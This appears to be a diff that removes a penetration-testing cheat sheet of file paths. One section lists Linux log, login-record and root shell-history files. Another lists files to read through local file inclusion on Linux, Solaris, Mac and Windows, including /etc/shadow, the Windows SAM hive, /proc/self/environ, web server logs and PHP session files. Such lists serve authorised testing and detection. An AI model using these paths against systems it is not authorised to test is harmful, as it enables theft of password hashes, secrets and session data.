-							 /var/log/stunnel4
-							 /var/log/sysstat
-							 /var/log/teamviewer15
-							 /var/log/tor
-							 /var/log/unattended-upgrades
-							 /var/log/vmware
-							 /var/log/zypp
-
-
-=============================================================================
-
-=============================================================================
-
-
- "/var/log/messages",
- "/var/log/auth.log",
- "/var/log/secure",
- "/var/log/dmesg",
- "/var/log/alternatives.log",
- "/var/log/anaconda.log",
- "/var/log/audit",
- "/var/log/boot.log",
- "/var/log/cron",
- "/var/log/cups",
- "/var/log/faillog",
- "/var/log/kern.log",
- "/var/log/maillog",
- "/var/log/mail.log",
- "/var/log/pm-powersave.log",
- "/var/log/spooler",
- "/var/log/lastlog",
- "/var/log/tallylog",
- "/var/log/btmp",
- "/var/log/utmp",
- "/var/log/wtmp",
- "/var/log/messages",
- "/var/log/warn",
- "/var/log/poplog",
- "/var/log/qmail",
- "/var/log/smtpd",
- "/var/log/telnetd",
- "/var/log/cups/access_log",
- "/var/log/cups/error_log",
- "/var/log/thttpd_log",
- "/var/log/spooler",
- "/var/spool/tmp",
- "/var/spool/errors",
- "/var/spool/locks",
- "/var/log/nctfpd.errs",
- "/var/log/acct",
- "/var/apache/log",
- "/var/apache/logs",
- "/usr/local/apache/log",
- "/usr/local/apache/logs",
- "/usr/local/www/logs/thttpd_log",
- "/var/log/news",
- "/var/log/news/news",
- "/var/log/news.all",
- "/var/log/news/news.all",
- "/var/log/news/news.crit",
- "/var/log/news/news.err",
- "/var/log/news/news.notice",
- "/var/log/news/suck.err",
- "/var/log/news/suck.notice",
- "/var/log/xferlog",
- "/var/log/proftpd/xferlog.legacy",
- "/var/log/proftpd.xferlog",
- "/var/log/proftpd.access_log",
- "/var/log/httpd/error_log",
- "/var/log/httpsd/ssl_log",
- "/var/log/httpsd/ssl.access_log",
- "/var/adm",
- "/var/run/utmp",
- "/etc/wtmp",
- "/etc/utmp",
- "/etc/mail/access",
- "/var/log/mail/info.log",
- "/var/log/mail/errors.log",
- "/var/log/httpd/*_log",
- "/var/log/ncftpd/misclog.txt",
- "/var/account/pacct",
- "/var/log/snort",
- "/var/log/bandwidth",
- "/var/log/explanations",
- "/var/log/syslog",
- "/var/log/user.log",
- "/var/log/daemons/info.log",
- "/var/log/daemons/warnings.log",
- "/var/log/daemons/errors.log",
- "/etc/httpd/logs/error_log",
- "/etc/httpd/logs/*_log",
- "/var/log/mysqld/mysqld.log"
- "/root/.ksh_history",
- "/root/.bash_history",
- "/root/.sh_history",
- "/root/.history",
- "/root/*_history",
- "/root/.login",
- "/root/.logout",
- "/root/.bash_logut",
- "/root/.Xauthority"
- "/etc/sv/ssh/log",
- "/etc/sv/tor/log",
-
-
-================================================================================
-
- Windows Fingerprinting
-================================================================================
-
-c:\WINDOWS\system32\eula.txt
-c:\boot.ini  
-c:\WINDOWS\win.ini  
-c:\WINNT\win.ini  
-c:\WINDOWS\Repair\SAM  
-c:\WINDOWS\php.ini  
-c:\WINNT\php.ini  
-c:\Program Files\Apache Group\Apache\conf\httpd.conf  
-c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
-c:\Program Files\xampp\apache\conf\httpd.conf  
-c:\php\php.ini  
-c:\php5\php.ini  
-c:\php4\php.ini  
-c:\apache\php\php.ini  
-c:\xampp\apache\bin\php.ini  
-c:\home2\bin\stable\apache\php.ini  
-c:\home\bin\stable\apache\php.ini
-
-
-
-
-==============================================================================
-Win
-PHP Session Locations 
-==============================================================================
-
-c:\WINDOWS\TEMP\  
-c:\php\sessions\  
-c:\php5\sessions\  
-c:\php4\sessions\
-
-
-
-
-==================================================================================
-Useful files for LFI
-
-Linux + Solaris files (Darwin [Mac] systems may have a prefix of /private/)
-==================================================================================
-
-- Fingerprinting (General files)
-
-    /etc/passwd
-    /etc/master.passwd
-    /etc/shadow
-    /var/db/shadow/hash
-    /etc/group
-    /etc/hosts
-    /etc/motd
-    /etc/issue
-    /etc/release
-    /etc/redhat-release
-    /etc/crontab
-    /etc/inittab
-    /proc/version
-    /proc/cmdline
-    /proc/self/environ
-    /proc/self/fd/0
-    /proc/self/fd/1
-    /proc/self/fd/2
-    /proc/self/fd/255
-    /etc/httpd.conf
-    /etc/apache2.conf
-    /etc/apache2/apache2.conf
-    /etc/apache2/httpd.conf
-    /etc/httpd/conf/httpd.conf
-    /etc/httpd/httpd.conf
-    /etc/apache2/conf/httpd.conf
-    /etc/apache/conf/httpd.conf
-    /usr/local/apache2/conf/httpd.conf
-    /usr/local/apache/conf/httpd.conf
-    /etc/apache2/sites-enabled/000-default
-    /etc/apache2/sites-available/default
-    /etc/nginx.conf
-    /etc/nginx/nginx.conf
-    /etc/nginx/sites-available/default
-    /etc/nginx/sites-enabled/default
-    /etc/ssh/sshd_config
-    /etc/my.cnf
-    /etc/mysql/my.cnf
-    /etc/php.ini
-    /var/mail/www-data
-    /var/mail/www
-    /var/mail/apache
-    /var/mail/nobody
-    /var/www/.bash_history
-    /root/.bash_history
-    /var/root/.bash_history
-    /var/root/.sh_history
-
-- Less common paths for httpd.conf/php.ini
-
-    /usr/local/apache/httpd.conf
-    /usr/local/apache2/httpd.conf
-    /usr/local/httpd/conf/httpd.conf
-    /usr/local/etc/apache/conf/httpd.conf
-    /usr/local/etc/apache2/conf/httpd.conf
-    /usr/local/etc/httpd/conf/httpd.conf
-    /usr/apache2/conf/httpd.conf
-    /usr/apache/conf/httpd.conf
-    /etc/http/conf/httpd.conf
-    /etc/http/httpd.conf
-    /opt/apache/conf/httpd.conf
-    /opt/apache2/conf/httpd.conf
-    /var/www/conf/httpd.conf
-    /usr/local/php/httpd.conf
-    /usr/local/php4/httpd.conf
-    /usr/local/php5/httpd.conf
-    /etc/httpd/php.ini
-    /usr/lib/php.ini
-    /usr/lib/php/php.ini
-    /usr/local/etc/php.ini
-    /usr/local/lib/php.ini
-    /usr/local/php/lib/php.ini
-    /usr/local/php4/lib/php.ini
-    /usr/local/php5/lib/php.ini
-    /usr/local/apache/conf/php.ini
-    /etc/php4/apache/php.ini
-    /etc/php4/apache2/php.ini
-    /etc/php5/apache/php.ini
-    /etc/php5/apache2/php.ini
-    /etc/php/php.ini
-    /etc/php/php4/php.ini
-    /etc/php/apache/php.ini
-    /etc/php/apache2/php.ini
-    /usr/local/Zend/etc/php.ini
-    /opt/xampp/etc/php.ini
-    /var/local/www/conf/php.ini
-    /etc/php/cgi/php.ini
-    /etc/php4/cgi/php.ini
-    /etc/php5/cgi/php.ini
-
-- OS Logs
-
- Linux
-
-    /var/log/lastlog
-    /var/log/wtmp
-    /var/run/utmp
-    /var/log/messages.log
-    /var/log/messages
-    /var/log/messages.0
-    /var/log/messages.0.gz
-    /var/log/messages.1
-    /var/log/messages.1.gz
-    /var/log/messages.2
-    /var/log/messages.2.gz
-    /var/log/messages.3
-    /var/log/messages.3.gz
-    /var/log/syslog.log
-    /var/log/syslog
-    /var/log/syslog.0
-    /var/log/syslog.0.gz
-    /var/log/syslog.1
-    /var/log/syslog.1.gz
-    /var/log/syslog.2
-    /var/log/syslog.2.gz
-    /var/log/syslog.3
-    /var/log/syslog.3.gz
-    /var/log/auth.log
-    /var/log/auth.log.0
-    /var/log/auth.log.0.gz
-    /var/log/auth.log.1
-    /var/log/auth.log.1.gz
-    /var/log/auth.log.2
-    /var/log/auth.log.2.gz
-    /var/log/auth.log.3
-    /var/log/auth.log.3.gz
-
- Solaris
-
-    /var/log/authlog
-    /var/log/syslog
-    /var/adm/lastlog
-    /var/adm/messages
-    /var/adm/messages.0
-    /var/adm/messages.1
-    /var/adm/messages.2
-    /var/adm/messages.3
-    /var/adm/utmpx
-    /var/adm/wtmpx
-
- Mac
-
-    /var/log/kernel.log
-    /var/log/secure.log
-    /var/log/mail.log
-    /var/run/utmp
-    /var/log/wtmp
-    /var/log/lastlog
-
-- HTTPD Logs
-
-    /var/log/access.log
-    /var/log/access_log
-    /var/log/error.log
-    /var/log/error_log
-    /var/log/apache2/access.log
-    /var/log/apache2/access_log
-    /var/log/apache2/error.log
-    /var/log/apache2/error_log
-    /var/log/apache/access.log
-    /var/log/apache/access_log
-    /var/log/apache/error.log
-    /var/log/apache/error_log
-    /var/log/httpd/access.log
-    /var/log/httpd/access_log
-    /var/log/httpd/error.log
-    /var/log/httpd/error_log
-    /etc/httpd/logs/access.log
-    /etc/httpd/logs/access_log
-    /etc/httpd/logs/error.log
-    /etc/httpd/logs/error_log
-    /usr/local/apache/logs/access.log
-    /usr/local/apache/logs/access_log
-    /usr/local/apache/logs/error.log
-    /usr/local/apache/logs/error_log
-    /usr/local/apache2/logs/access.log
-    /usr/local/apache2/logs/access_log
-    /usr/local/apache2/logs/error.log
-    /usr/local/apache2/logs/error_log
-    /var/www/logs/access.log
-    /var/www/logs/access_log
-    /var/www/logs/error.log
-    /var/www/logs/error_log
-    /opt/lampp/logs/access.log
-    /opt/lampp/logs/access_log
-    /opt/lampp/logs/error.log
-    /opt/lampp/logs/error_log
-    /opt/xampp/logs/access.log
-    /opt/xampp/logs/access_log
-    /opt/xampp/logs/error.log
-    /opt/xampp/logs/error_log
-
-- PHP Session Locations
-
-    /tmp/sess_<sessid>
-    /var/lib/php/session/sess_<sessid>
-    /var/lib/php5/session/sess_<sessid>
-
-Windows files
-
-- Fingerprinting
-
-    *:\boot.ini
-    *:\WINDOWS\win.ini
-    *:\WINNT\win.ini
-    *:\WINDOWS\Repair\SAM
-    *:\WINDOWS\php.ini
-    *:\WINNT\php.ini
-    *:\Program Files\Apache Group\Apache\conf\httpd.conf
-    *:\Program Files\Apache Group\Apache2\conf\httpd.conf
-    *:\Program Files\xampp\apache\conf\httpd.conf
-    *:\php\php.ini
-    *:\php5\php.ini
-    *:\php4\php.ini
-    *:\apache\php\php.ini
-    *:\xampp\apache\bin\php.ini
-    *:\home2\bin\stable\apache\php.ini
-    *:\home\bin\stable\apache\php.ini
-
-- Logs
-
-    *:\Program Files\Apache Group\Apache\logs\access.log
-    *:\Program Files\Apache Group\Apache\logs\error.log
-
-- PHP Session Locations
-
-    *:\WINDOWS\TEMP\
-    *:\php\sessions\
-    *:\php5\sessions\
-    *:\php4\sessions\
